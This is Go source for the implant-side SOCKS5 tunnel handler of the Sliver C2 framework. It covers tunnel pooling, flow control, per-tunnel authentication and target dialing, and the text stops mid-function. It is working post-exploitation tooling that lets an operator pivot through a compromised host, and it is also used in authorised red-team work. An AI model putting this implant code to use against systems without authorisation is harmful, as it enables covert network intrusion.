package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/things-go/go-socks5"
	"google.golang.org/protobuf/proto"
)

const (
	socksTunnelIngressBuffer      = 128
	socksTunnelMaxPendingFrames   = 128
	socksTunnelMaxPendingBytes    = socksTunnelMaxPendingFrames * sliverpb.MaxTunnelFrameBytes
	socksTunnelMaxRawFrameBytes   = 128 * 1024
	socksTunnelMaxCredentialBytes = 255
	socksTunnelMaxActive          = 256
	// Retained states include both active SOCKS actors and closed replay
	// tombstones. Each tombstone owns one expiry timer, so bounding the map also
	// bounds timer retention during a flood of unique tunnel IDs.
	socksTunnelMaxRetained        = socksTunnelMaxActive * 2
	socksTunnelMaxPendingTotal    = 64 * 1024 * 1024
	socksTunnelCloseReorderWindow = 5 * time.Second
	socksTunnelGracefulDrain      = 30 * time.Second
	socksTunnelHandshakeTimeout   = 15 * time.Second
	socksTunnelTombstoneDuration  = 30 * time.Second
	socksTunnelRejectionSendLimit = 16
	// Flow-control acknowledgements cover complete protocol frames rather than
	// bytes. Keep the sender window at half the existing 128-frame receiver
	// admission bound so transport reordering and terminal/control frames retain
	// headroom without making ordinary TCP backpressure terminal.
	socksTunnelFlowWindow   = sliverpb.SocksFlowControlWindowV1
	socksTunnelFlowAckBatch = sliverpb.SocksFlowControlAckBatchV1
)

var errSocksFlowAckAhead = errors.New("SOCKS flow-control acknowledgement exceeds sent sequence")

const (
	socksTunnelActive uint32 = iota
	socksTunnelGraceful
	socksTunnelClosed
)

type socksTunnelPool struct {
	mutex             sync.Mutex
	tunnels           map[uint64]*socksTunnelState
	tombstoneDuration time.Duration
	closeWindow       time.Duration
	active            int
	pendingBytes      int
	maxActive         int
	maxRetained       int
	maxPendingBytes   int
	rejectionSlots    chan struct{}
	scheduleRemoval   func(time.Duration, func())
}

var socksTunnels = socksTunnelPool{
	tunnels:           map[uint64]*socksTunnelState{},
	tombstoneDuration: socksTunnelTombstoneDuration,
	maxActive:         socksTunnelMaxActive,
	maxRetained:       socksTunnelMaxRetained,
	maxPendingBytes:   socksTunnelMaxPendingTotal,
}

type socksTunnelFrame struct {
	sequence     uint64
	data         []byte
	close        bool
	capabilities uint64
	username     string
	password     string
	serverStart  chan socksServerAdmission
}

type socksServerAdmission uint8

const (
	socksServerRejected socksServerAdmission = iota
	socksServerAccepted
	socksServerStart
)

type socksTunnelState struct {
	data             chan socksTunnelFrame
	ingress          chan socksTunnelFrame
	ingressMutex     sync.Mutex
	done             chan struct{}
	inputEOF         chan struct{}
	established      chan struct{}
	ownerDone        <-chan struct{}
	closeWindow      time.Duration
	drainWindow      time.Duration
	handshakeTimeout time.Duration
	startOnce        sync.Once
	handshakeOnce    sync.Once
	closeOnce        sync.Once
	gracefulOnce     sync.Once
	establishedOnce  sync.Once
	lifecycle        atomic.Uint32
	startMutex       sync.Mutex
	serverReady      bool
	serverClaimed    bool
	username         string
	password         string
	onClose          func()
	budgetMutex      sync.Mutex
	budgetFrames     int
	budgetBytes      int
	budgetClosed     bool
	retainedBytes    int
	retainedOnce     sync.Once
	reserveTotal     func(int) bool
	releaseTotal     func(int)
	outboundMutex    sync.Mutex
	outboundSequence uint64
	outboundClosed   bool
	flowMutex        sync.Mutex
	flowEnabled      bool
	outboundAck      uint64
	flowChanged      chan struct{}
	inboundConsumed  uint64
	inboundAckSent   uint64
	terminalOnce     sync.Once
	terminalErr      error
}

func newSocksTunnelState(onClose ...func()) *socksTunnelState {
	var callback func()
	if len(onClose) > 0 {
		callback = onClose[0]
	}
	return newOwnedSocksTunnelState(nil, callback)
}

func newOwnedSocksTunnelState(ownerDone <-chan struct{}, onClose func()) *socksTunnelState {
	return newOwnedSocksTunnelStateWithWindow(ownerDone, onClose, socksTunnelCloseReorderWindow)
}

func newOwnedSocksTunnelStateWithWindow(ownerDone <-chan struct{}, onClose func(), closeWindow time.Duration) *socksTunnelState {
	tunnel := newUnstartedSocksTunnelState(ownerDone, onClose, closeWindow)
	tunnel.start()
	return tunnel
}

// newUnstartedSocksTunnelState returns a fully allocated actor without
// publishing any goroutine. Pool-owned states use this split constructor so
// identity, accounting, and lifecycle callbacks are installed before an
// already-closed owner can retire the state.
func newUnstartedSocksTunnelState(ownerDone <-chan struct{}, onClose func(), closeWindow time.Duration) *socksTunnelState {
	return &socksTunnelState{
		// The actor must never block behind a slow SOCKS consumer because that
		// would also hide a later terminal or reorder timeout. Reservations cover
		// this queue until the adapter consumes each entire frame.
		data:             make(chan socksTunnelFrame, socksTunnelMaxPendingFrames),
		ingress:          make(chan socksTunnelFrame, socksTunnelIngressBuffer),
		done:             make(chan struct{}),
		inputEOF:         make(chan struct{}),
		established:      make(chan struct{}),
		ownerDone:        ownerDone,
		closeWindow:      closeWindow,
		drainWindow:      socksTunnelGracefulDrain,
		handshakeTimeout: socksTunnelHandshakeTimeout,
		onClose:          onClose,
		flowChanged:      make(chan struct{}),
	}
}

func (s *socksTunnelState) start() {
	s.startOnce.Do(func() {
		go s.run()
		if s.ownerDone != nil {
			go func() {
				select {
				case <-s.ownerDone:
					s.close()
				case <-s.done:
				}
			}()
		}
	})
}

// SocksReqHandler dispatches one server-to-implant SOCKS tunnel frame.
func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	handleSocksReq(envelope, connection, &socksTunnels)
}

//nolint:gocyclo // Decode, bounded admission, ownership, and terminal handling form one dispatch transition.
func handleSocksReq(envelope *sliverpb.Envelope, connection *transports.Connection, pool *socksTunnelPool) {
	if envelope == nil || len(envelope.Data) > socksTunnelMaxRawFrameBytes {
		// Bound the protobuf before decoding or cloning any attacker-controlled
		// fields. A valid SOCKS frame carries at most one 64 KiB data payload.
		return
	}
	socksData := &sliverpb.SocksData{}
	err := proto.Unmarshal(envelope.Data, socksData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}
	if socksData.Ack != 0 {
		// ACKs are out-of-band controls. They must never allocate or resurrect a
		// SOCKS actor, and mixed data/control frames are not part of V1.
		tunnel, ok := pool.get(socksData.TunnelID)
		if !ok || tunnel.isClosed() || !tunnel.isOwnedBy(connection) {
			return
		}
		if len(socksData.Data) != 0 || socksData.CloseConn || socksData.Sequence != 0 ||
			socksData.Username != "" || socksData.Password != "" || socksData.Capabilities != 0 || socksData.Request != nil {
			tunnel.close()
			return
		}
		if err := tunnel.acknowledgeOutbound(socksData.Ack); err != nil {
			tunnel.close()
		}
		return
	}
	if !socksData.CloseConn && len(socksData.Data) == 0 {
		// A metadata-only frame may bind the server-side stream before the
		// user sends a SOCKS greeting. It does not belong in the byte stream.
		return
	}

	// {{if .Config.Debug}}
	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
	// {{end}}

	// Tunnel envelopes are dispatched in independent goroutines by the implant
	// runner. Submit every frame to a per-tunnel sequencer so adjacent data and
	// the terminal close retain their wire order. A retained closed state also
	// rejects handlers that arrive late instead of resurrecting the tunnel.
	tunnel, _ := pool.loadOrCreateForConnection(socksData.TunnelID, connection)
	if tunnel == nil {
		// The connection-wide pool is saturated. Refuse a new tunnel without
		// allocating another actor or retaining attacker-controlled input. The
		// exact sequence-zero terminal retires the server generation; if the C2
		// cannot accept it, fail the connection so server session cleanup owns the
		// remaining lifecycle.
		if !pool.sendRejectedTerminal(connection, socksData.TunnelID) {
			failSocksConnectionClosed(connection)
		}
		return
	}
	frame := socksTunnelFrame{
		sequence:     socksData.Sequence,
		data:         socksData.Data,
		close:        socksData.CloseConn,
		capabilities: socksData.Capabilities,
	}
	if socksData.Sequence != 0 {
		// Only the first ordered frame can activate a protocol extension. Unknown
		// metadata on later frames is never allowed to change tunnel semantics.
		frame.capabilities = 0
	}
	if socksData.Sequence == 0 && !socksData.CloseConn {
		// Only the canonical first byte-stream frame may define authentication.
		// Later frames are deliberately stripped even when they carry metadata.
		frame.username = socksData.Username
		frame.password = socksData.Password
	}
	accepted, startServer := tunnel.submitForServer(frame)
	frame.username = ""
	frame.password = ""
	if !accepted {
		if tunnel.isGraceful() {
			// Ordered EOF already owns this generation. A handler scheduled after
			// the terminal must not turn its bounded drain into an abort that can
			// truncate an earlier frame still held by the SOCKS reader.
			return
		}
		// Rejection may be a per-tunnel frame/byte admission failure. Ensure the
		// exact remote generation sees a contiguous terminal instead of waiting on
		// a local SOCKS adapter that may never have started.
		tunnel.close()
		if err := tunnel.sendTerminal(connection, socksData.TunnelID); err != nil {
			failSocksConnectionClosed(connection)
		}
		return
	}
	if startServer {
		username, password, claimed := tunnel.takeServerCredentials()
		if !claimed {
			return
		}
		socksData.Username = ""
		socksData.Password = ""
		defer pool.release(socksData.TunnelID, tunnel)
		// Authentication belongs to this tunnel. A package-global server would
		// let one authenticated connection change every later connection's
		// policy, including otherwise independent no-auth proxies.
		tunnel.startHandshakeLease()
		server := newSocksServerForTunnel(username, password, tunnel)
		err := server.ServeConn(&socks{
			stream: &sliverpb.SocksData{TunnelID: socksData.TunnelID},
			conn:   connection,
			tunnel: tunnel,
		})
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[socks] Failed to serve connection: %v", err)
			// {{end}}
			return
		}
	}
}

func newSocksServer(username string, password string, owner ...<-chan struct{}) *socks5.Server {
	var ownerDone <-chan struct{}
	if len(owner) > 0 {
		ownerDone = owner[0]
	}
	return newSocksServerWithLifecycle(username, password, ownerDone, nil)
}

func newSocksServerForTunnel(username string, password string, tunnel *socksTunnelState) *socks5.Server {
	if tunnel == nil {
		return newSocksServer(username, password)
	}
	return newSocksServerWithLifecycle(username, password, tunnel.done, tunnel.markEstablished)
}

func newSocksServerWithLifecycle(username string, password string, ownerDone <-chan struct{}, established func()) *socks5.Server {
	options := []socks5.Option{
		// Sliver's in-band adapter is a TCP stream. BIND and UDP ASSOCIATE
		// cannot be represented and the latter requires a concrete TCP local
		// address that this virtual net.Conn intentionally does not expose.
		socks5.WithRule(hostnameDialSocksRule{
			delegate: &socks5.PermitCommand{EnableConnect: true},
		}),
		socks5.WithResolver(ownedSocksResolver{ownerDone: ownerDone}),
		socks5.WithDial(func(ctx context.Context, network string, address string) (net.Conn, error) {
			connection, err := dialOwnedSocksTarget(ctx, network, socksTargetDialAddress(ctx, address), ownerDone)
			if err == nil && established != nil {
				established()
			}
			return connection, err
		}),
	}
	if username == "" || password == "" {
		return socks5.NewServer(options...)
	}
	credentials := socks5.StaticCredentials{username: password}
	authenticator := socks5.UserPassAuthenticator{Credentials: credentials}
	options = append(options, socks5.WithAuthMethods([]socks5.Authenticator{authenticator}))
	return socks5.NewServer(options...)
}

// hostnameDialSocksRule preserves the post-rewrite hostname for the final
// net.Dialer call. The upstream resolver interface returns only one IP, which
// can select ::1 for a dual-stack hostname even when the reachable service is
// IPv4-only. The request retains that resolved IP for rule evaluation, while
// the existing RuleSet context handoff lets Go try every resolved address.
// These APIs are present in both of Sliver's vendored go-socks5 trees.
type hostnameDialSocksRule struct {
	delegate socks5.RuleSet
}

type socksTargetDialAddressContextKey struct{}

func (r hostnameDialSocksRule) Allow(ctx context.Context, request *socks5.Request) (context.Context, bool) {
	if request == nil || r.delegate == nil {
		return ctx, false
	}
	ctx, allowed := r.delegate.Allow(ctx, request)
	if !allowed || request.DestAddr == nil || request.DestAddr.FQDN == "" {
		return ctx, allowed
	}
	address := net.JoinHostPort(request.DestAddr.FQDN, strconv.Itoa(request.DestAddr.Port))
	return context.WithValue(ctx, socksTargetDialAddressContextKey{}, address), true
}

func socksTargetDialAddress(ctx context.Context, resolvedAddress string) string {
	if requestedAddress, ok := ctx.Value(socksTargetDialAddressContextKey{}).(string); ok && requestedAddress != "" {
		return requestedAddress
	}
	return resolvedAddress
}

type ownedSocksResolver struct {
	ownerDone    <-chan struct{}
	lookupIPAddr func(context.Context, string) ([]net.IPAddr, error)
}

type socksResolverWatchContextKey struct{}

type socksResolverWatch struct {
	cancel   context.CancelFunc
	stop     chan struct{}
	done     chan struct{}
	stopOnce sync.Once
}

func newSocksResolverWatch(ctx context.Context, ownerDone <-chan struct{}) (context.Context, *socksResolverWatch) {
	if ownerDone == nil {
		return ctx, nil
	}
	linkedContext, cancel := context.WithCancel(ctx)
	watch := &socksResolverWatch{
		cancel: cancel,
		stop:   make(chan struct{}),
		done:   make(chan struct{}),
	}
	go func() {
		defer close(watch.done)
		select {
		case <-ownerDone:
			cancel()
		case <-ctx.Done():
			cancel()
		case <-watch.stop:
		}
	}()
	return context.WithValue(linkedContext, socksResolverWatchContextKey{}, watch), watch
}

func (w *socksResolverWatch) release() {
	if w == nil {
		return
	}
	w.stopOnce.Do(func() {
		close(w.stop)
		w.cancel()
	})
	<-w.done
}

func releaseSocksResolverWatch(ctx context.Context) {
	if ctx == nil {
		return
	}
	watch, _ := ctx.Value(socksResolverWatchContextKey{}).(*socksResolverWatch)
	if watch != nil {
		watch.release()
	}
}

func (r ownedSocksResolver) Resolve(ctx context.Context, name string) (context.Context, net.IP, error) {
	resolveContext, watch := newSocksResolverWatch(ctx, r.ownerDone)
	lookupIPAddr := r.lookupIPAddr
	if lookupIPAddr == nil {
		lookupIPAddr = net.DefaultResolver.LookupIPAddr
	}
	addresses, err := lookupIPAddr(resolveContext, name)
	if err != nil {
		if watch != nil {
			watch.release()
		}
		return resolveContext, nil, err
	}
	if len(addresses) == 0 {
		if watch != nil {
			watch.release()
		}
		return resolveContext, nil, fmt.Errorf("resolve SOCKS target %q returned no addresses", name)
	}
	return resolveContext, addresses[0].IP, nil
}

type ownedSocksTargetConnection struct {
	net.Conn
	stop      chan struct{}
	closeOnce sync.Once
	closeErr  error
}

func dialOwnedSocksTarget(ctx context.Context, network string, address string, ownerDone <-chan struct{}) (net.Conn, error) {
	dialer := &net.Dialer{}
	return dialOwnedSocksTargetWith(ctx, network, address, ownerDone, dialer.DialContext)
}

func dialOwnedSocksTargetWith(
	ctx context.Context,
	network string,
	address string,
	ownerDone <-chan struct{},
	dial func(context.Context, string, string) (net.Conn, error),
) (net.Conn, error) {
	defer releaseSocksResolverWatch(ctx)
	dialContext, cancel := context.WithCancel(ctx)
	watchDone := make(chan struct{})
	if ownerDone != nil {
		go func() {
			select {
			case <-ownerDone:
				cancel()
			case <-watchDone:
			}
		}()
	}
	connection, err := dial(dialContext, network, address)
	close(watchDone)
	cancel()
	if err != nil {
		return nil, err
	}

	owned := &ownedSocksTargetConnection{Conn: connection, stop: make(chan struct{})}
	if ownerDone != nil {
		go func() {
			select {
			case <-ownerDone:
				_ = owned.Close()
			case <-owned.stop:
			}
		}()
	}
	return owned, nil
}

func (c *ownedSocksTargetConnection) Close() error {
	c.closeOnce.Do(func() {
		close(c.stop)
		c.closeErr = c.Conn.Close()
	})
	return c.closeErr
}

func (c *ownedSocksTargetConnection) CloseWrite() error {
	if closeWriter, ok := c.Conn.(interface{ CloseWrite() error }); ok {
		return closeWriter.CloseWrite()
	}
	return c.Close()
}

func (s *socksTunnelState) write(connection *transports.Connection, tunnelID uint64, payload []byte) (int, error) {
	if len(payload) == 0 {
		return 0, nil
	}

	for {
		s.outboundMutex.Lock()
		if s.outboundClosed || s.isClosed() {
			s.outboundMutex.Unlock()
			return 0, transports.ErrTunnelClosed
		}

		s.flowMutex.Lock()
		if s.flowEnabled && s.outboundSequence-s.outboundAck >= socksTunnelFlowWindow {
			changed := s.flowChanged
			s.flowMutex.Unlock()
			s.outboundMutex.Unlock()
			// Do not retain the outbound sequence lock while waiting. Terminal
			// teardown must be able to wake a full-window writer in either direction.
			select {
			case <-s.done:
				return 0, transports.ErrTunnelClosed
			case <-s.ownerDone:
				s.close()
				return 0, transports.ErrTunnelClosed
			case <-changed:
			}
			continue
		}
		s.flowMutex.Unlock()

		sequence := s.outboundSequence
		if sequence == ^uint64(0) {
			s.outboundMutex.Unlock()
			return 0, transports.ErrTunnelClosed
		}
		data, err := proto.Marshal(&sliverpb.SocksData{
			TunnelID: tunnelID,
			Data:     payload,
			Sequence: sequence,
		})
		if err != nil {
			s.outboundMutex.Unlock()
			return 0, err
		}
		// {{if .Config.Debug}}
		log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d\n", sequence, len(payload))
		// {{end}}
		if connection == nil || !connection.SendEnvelope(&sliverpb.Envelope{
			Type: sliverpb.MsgSocksData,
			Data: data,
		}) {
			s.outboundMutex.Unlock()
			return 0, transports.ErrTunnelClosed
		}

		s.outboundSequence++
		s.outboundMutex.Unlock()
		return len(payload), nil
	}
}

func (s *socksTunnelState) enableFlowControl(capabilities uint64) {
	if capabilities&sliverpb.CapabilitySocksFlowControlV1 == 0 {
		return
	}
	s.flowMutex.Lock()
	s.flowEnabled = true
	s.flowMutex.Unlock()
}

func (s *socksTunnelState) isFlowControlEnabled() bool {
	if s == nil {
		return false
	}
	s.flowMutex.Lock()
	defer s.flowMutex.Unlock()
	return s.flowEnabled
}

func (s *socksTunnelState) isOwnedBy(connection *transports.Connection) bool {
	if s == nil || connection == nil || s.ownerDone == nil {
		return false
	}
	return s.ownerDone == connection.Done()
}

// acknowledgeOutbound advances the cumulative credit returned by the operator
// for implant-to-client frames. Duplicate/stale ACKs are harmless; an ACK for
// data that has not been sent is a tunnel-scoped protocol violation.
func (s *socksTunnelState) acknowledgeOutbound(ack uint64) error {
	if s == nil || ack == 0 || s.isClosed() {
		return nil
	}
	s.outboundMutex.Lock()
	defer s.outboundMutex.Unlock()
	s.flowMutex.Lock()
	defer s.flowMutex.Unlock()
	if !s.flowEnabled || ack <= s.outboundAck {
		return nil
	}
	if ack > s.outboundSequence {
		return fmt.Errorf("%w: got %d, sent %d", errSocksFlowAckAhead, ack, s.outboundSequence)
	}
	s.outboundAck = ack
	close(s.flowChanged)
	s.flowChanged = make(chan struct{})
	return nil
}

// acknowledgeInboundConsumed emits a cumulative ACK only after the adapter has
// copied the entire ordered client-to-implant frame. The vendored SOCKS copy
// loop may retain at most its current copy buffer beyond this boundary.
func (s *socksTunnelState) acknowledgeInboundConsumed(connection *transports.Connection, tunnelID uint64, sequence uint64) error {
	if s == nil || sequence == ^uint64(0) {
		return nil
	}
	s.flowMutex.Lock()
	if !s.flowEnabled {
		s.flowMutex.Unlock()
		return nil
	}
	next := sequence + 1
	if next > s.inboundConsumed {
		s.inboundConsumed = next
	}
	if s.inboundConsumed-s.inboundAckSent < socksTunnelFlowAckBatch {
		s.flowMutex.Unlock()
		return nil
	}
	ack := s.inboundConsumed
	s.inboundAckSent = ack
	s.flowMutex.Unlock()
	return sendSocksAck(connection, tunnelID, ack)
}

func (s *socksTunnelState) flushInboundAck(connection *transports.Connection, tunnelID uint64) error {
	if s == nil {
		return nil
	}
	s.flowMutex.Lock()
	if !s.flowEnabled || s.inboundConsumed <= s.inboundAckSent {
		s.flowMutex.Unlock()
		return nil
	}
	ack := s.inboundConsumed
	s.inboundAckSent = ack
	s.flowMutex.Unlock()
	return sendSocksAck(connection, tunnelID, ack)
}

func sendSocksAck(connection *transports.Connection, tunnelID uint64, ack uint64) error {
	data, err := proto.Marshal(&sliverpb.SocksData{TunnelID: tunnelID, Ack: ack})
	if err != nil {
		return err
	}
	if connection == nil || !connection.SendEnvelope(&sliverpb.Envelope{Type: sliverpb.MsgSocksData, Data: data}) {
		failSocksConnectionClosed(connection)
		return transports.ErrTunnelClosed
	}
	return nil
}

// sendTerminal serializes the terminal with every accepted outbound payload.
// The state owns this once operation so an admission failure, ServeConn return,
// and owner teardown can race without emitting differently sequenced closes.
func (s *socksTunnelState) sendTerminal(connection *transports.Connection, tunnelID uint64) error {
	s.terminalOnce.Do(func() {
		s.outboundMutex.Lock()
		defer s.outboundMutex.Unlock()
		s.outboundClosed = true
		s.terminalErr = sendSocksTerminal(connection, tunnelID, s.outboundSequence)
		if s.terminalErr != nil {
			failSocksConnectionClosed(connection)
		}
	})
	return s.terminalErr
}

func sendSocksTerminal(connection *transports.Connection, tunnelID uint64, sequence uint64) error {
	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID:  tunnelID,
		CloseConn: true,
		Sequence:  sequence,
	})
	if err != nil {
		return err
	}
	if connection == nil || !connection.SendEnvelope(&sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}) {
		return transports.ErrTunnelClosed
	}
	return nil
}

var _ net.Conn = &socks{}

type socks struct {
	stream    *sliverpb.SocksData
	conn      *transports.Connection
	tunnel    *socksTunnelState
	readMu    sync.Mutex
	remainder []byte
	readFrame socksTunnelFrame
	hasFrame  bool
	closeOnce sync.Once
	closeErr  error
}

func (s *socks) Read(b []byte) (n int, err error) {
	if len(b) == 0 {
		return 0, nil
	}

	s.readMu.Lock()
	defer s.readMu.Unlock()
	if s.tunnel.isClosed() {
		_ = s.releaseReadFrame(false)
		return 0, io.EOF
	}
	if len(s.remainder) == 0 {
		frame, readErr := s.tunnel.readFrame()
		if readErr != nil {
			if errors.Is(readErr, io.EOF) {
				if ackErr := s.tunnel.flushInboundAck(s.conn, s.stream.TunnelID); ackErr != nil {
					return 0, ackErr
				}
			}
			return 0, readErr
		}
		s.readFrame = frame
		s.hasFrame = true
		s.remainder = frame.data
	}
	n = copy(b, s.remainder)
	s.remainder = s.remainder[n:]
	if len(s.remainder) == 0 {
		s.remainder = nil
		if ackErr := s.releaseReadFrame(true); ackErr != nil {
			return n, ackErr
		}
	}
	return n, nil
}

func (s *socks) releaseReadFrame(consumed bool) error {
	if !s.hasFrame {
		return nil
	}
	frame := s.readFrame
	s.tunnel.release(s.readFrame)
	s.readFrame = socksTunnelFrame{}
	s.hasFrame = false
	s.remainder = nil
	if consumed {
		return s.tunnel.acknowledgeInboundConsumed(s.conn, s.stream.TunnelID, frame.sequence)
	}
	return nil
}

func (s *socks) Write(b []byte) (n int, err error) {
	return s.tunnel.write(s.conn, s.stream.TunnelID, b)
}

func (s *socks) Close() error {
	s.closeOnce.Do(func() {
		s.closeErr = s.close()
	})
	return s.closeErr
}

func (s *socks) close() error {
	s.tunnel.close()
	s.readMu.Lock()
	_ = s.releaseReadFrame(false)
	s.readMu.Unlock()
	return s.tunnel.sendTerminal(s.conn, s.stream.TunnelID)
}

func failSocksConnectionClosed(connection *transports.Connection) {
	if connection == nil {
		return
	}
	select {
	case <-connection.Done():
		return
	default:
		connection.Cleanup()
	}
}

func (s *socks) LocalAddr() net.Addr {
	return nil
}

func (s *socks) RemoteAddr() net.Addr {
	return &net.IPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Zone: "",
	}
}

// TODO impl
func (s *socks) SetDeadline(_ time.Time) error {
	return nil
}

// TODO impl
func (s *socks) SetReadDeadline(_ time.Time) error {
	return nil
}

// TODO impl
func (s *socks) SetWriteDeadline(_ time.Time) error {
	return nil
}

func (s *socksTunnelPool) loadOrCreate(tunnelID uint64, owner ...<-chan struct{}) (*socksTunnelState, bool) {
	var ownerDone <-chan struct{}
	if len(owner) > 0 {
		ownerDone = owner[0]
	}
	return s.loadOrCreateOwned(tunnelID, ownerDone, nil)
}

func (s *socksTunnelPool) loadOrCreateForConnection(tunnelID uint64, connection *transports.Connection) (*socksTunnelState, bool) {
	var ownerDone <-chan struct{}
	if connection != nil {
		ownerDone = connection.Done()
	}
	return s.loadOrCreateOwned(tunnelID, ownerDone, connection)
}

func (s *socksTunnelPool) loadOrCreateOwned(tunnelID uint64, ownerDone <-chan struct{}, connection *transports.Connection) (*socksTunnelState, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if s.tunnels == nil {
		s.tunnels = map[uint64]*socksTunnelState{}
	}
	if tunnel, ok := s.tunnels[tunnelID]; ok {
		return tunnel, false
	}
	maxRetained := s.maxRetained
	if maxRetained <= 0 {
		maxRetained = socksTunnelMaxRetained
	}
	if len(s.tunnels) >= maxRetained {
		return nil, false
	}
	maxActive := s.maxActive
	if maxActive <= 0 {
		maxActive = socksTunnelMaxActive
	}
	if s.active >= maxActive {
		return nil, false
	}

	// Do not start the actor or owner watcher until this exact pointer is fully
	// initialized, published, and charged to the pool. In particular, ownerDone
	// may already be closed when a dispatch races connection teardown.
	closeWindow := s.closeWindow
	if closeWindow <= 0 {
		closeWindow = socksTunnelCloseReorderWindow
	}
	tunnel := newUnstartedSocksTunnelState(ownerDone, nil, closeWindow)
	tunnel.onClose = func() {
		s.retire(tunnelID, tunnel)
		if connection != nil {
			_ = tunnel.sendTerminal(connection, tunnelID)
		}
	}
	tunnel.reserveTotal = s.reservePendingBytes
	tunnel.releaseTotal = s.releasePendingBytes
	s.tunnels[tunnelID] = tunnel
	s.active++
	tunnel.start()
	return tunnel, true
}

func (s *socksTunnelPool) close(tunnelID uint64) bool {
	s.mutex.Lock()
	tunnel, ok := s.tunnels[tunnelID]
	s.mutex.Unlock()
	if !ok {
		return false
	}
	return tunnel.close()
}

func (s *socksTunnelPool) release(_ uint64, tunnel *socksTunnelState) {
	if tunnel != nil {
		tunnel.close()
	}
}

func (s *socksTunnelPool) retire(tunnelID uint64, tunnel *socksTunnelState) {
	s.mutex.Lock()
	if s.tunnels[tunnelID] == tunnel && s.active > 0 {
		s.active--
	}
	s.mutex.Unlock()

	remove := func() {
		removed := false
		s.mutex.Lock()
		if s.tunnels[tunnelID] == tunnel {
			delete(s.tunnels, tunnelID)
			removed = true
		}
		s.mutex.Unlock()
		if removed {
			tunnel.releaseRetainedBudget()
		}
	}
	if s.tombstoneDuration <= 0 {
		remove()
		return
	}
	if s.scheduleRemoval != nil {
		s.scheduleRemoval(s.tombstoneDuration, remove)
		return
	}
	time.AfterFunc(s.tombstoneDuration, remove)
}

func (s *socksTunnelPool) reservePendingBytes(size int) bool {
	if size < 0 {
		return false
	}
	s.mutex.Lock()
	defer s.mutex.Unlock()
	maxPendingBytes := s.maxPendingBytes
	if maxPendingBytes <= 0 {
		maxPendingBytes = socksTunnelMaxPendingTotal
	}
	if size > maxPendingBytes-s.pendingBytes {
		return false
	}
	s.pendingBytes += size
	return true
}

func (s *socksTunnelPool) releasePendingBytes(size int) {
	if size <= 0 {
		return
	}
	s.mutex.Lock()
	s.pendingBytes -= size
	if s.pendingBytes < 0 {
		s.pendingBytes = 0
	}
	s.mutex.Unlock()
}

func (s *socksTunnelPool) get(tunnelID uint64) (*socksTunnelState, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	tunnel, ok := s.tunnels[tunnelID]
	return tunnel, ok
}

// sendRejectedTerminal limits concurrently blocked rejection writers. Implant
// dispatch launches one handler goroutine per envelope, so a full tunnel pool
// plus a stalled outbound C2 would otherwise retain one goroutine for every
// attacker-controlled tunnel ID until each SendEnvelope timeout elapsed.
func (s *socksTunnelPool) sendRejectedTerminal(connection *transports.Connection, tunnelID uint64) bool {
	s.mutex.Lock()
	if s.rejectionSlots == nil {
		s.rejectionSlots = make(chan struct{}, socksTunnelRejectionSendLimit)
	}
	slots := s.rejectionSlots
	s.mutex.Unlock()

	select {
	case slots <- struct{}{}:
		defer func() { <-slots }()
		return sendSocksTerminal(connection, tunnelID, 0) == nil
	default:
		return false
	}
}

func (s *socksTunnelState) submit(frame socksTunnelFrame) bool {
	accepted, _ := s.submitForServer(frame)
	return accepted
}

//nolint:gocyclo // Validation and actor publication are one atomic admission contract.
func (s *socksTunnelState) submitForServer(frame socksTunnelFrame) (accepted bool, startServer bool) {
	// Serialize validation, reservation, and channel publication with graceful
	// terminal transition. Once ordered EOF is visible, no late handler can
	// publish work behind an actor that has already returned or turn that EOF
	// into an abortive protocol failure.
	s.ingressMutex.Lock()
	if s.lifecycle.Load() != socksTunnelActive {
		s.ingressMutex.Unlock()
		return false, false
	}
	if frame.close && len(frame.data) != 0 {
		s.ingressMutex.Unlock()
		s.close()
		return false, false
	}
	if frame.sequence == 0 && !frame.close {
		if len(frame.username) > socksTunnelMaxCredentialBytes || len(frame.password) > socksTunnelMaxCredentialBytes {
			s.ingressMutex.Unlock()
			s.close()
			return false, false
		}
		frame.serverStart = make(chan socksServerAdmission, 1)
	} else {
		// Authentication is meaningful only on canonical sequence zero. Do not
		// retain attacker-controlled metadata from future frames.
		frame.username = ""
		frame.password = ""
	}
	if !s.reserve(frame) {
		s.ingressMutex.Unlock()
		s.close()
		return false, false
	}
	frame.data = append([]byte(nil), frame.data...)
	select {
	case <-s.done:
		s.release(frame)
		s.ingressMutex.Unlock()
		return false, false
	case <-s.ownerDone:
		s.release(frame)
		s.ingressMutex.Unlock()
		s.close()
		return false, false
	case s.ingress <- frame:
	}
	s.ingressMutex.Unlock()
	if frame.serverStart == nil {
		return true, false
	}
	select {
	case admission := <-frame.serverStart:
		return admission != socksServerRejected, admission == socksServerStart
	case <-s.done:
		return false, false
	case <-s.ownerDone:
		s.close()
		return false, false
	}
}

func (s *socksTunnelState) reserve(frame socksTunnelFrame) bool {
	if len(frame.data) > sliverpb.MaxTunnelFrameBytes {
		return false
	}
	s.budgetMutex.Lock()
	defer s.budgetMutex.Unlock()
	if s.budgetClosed || s.budgetFrames >= socksTunnelMaxPendingFrames ||
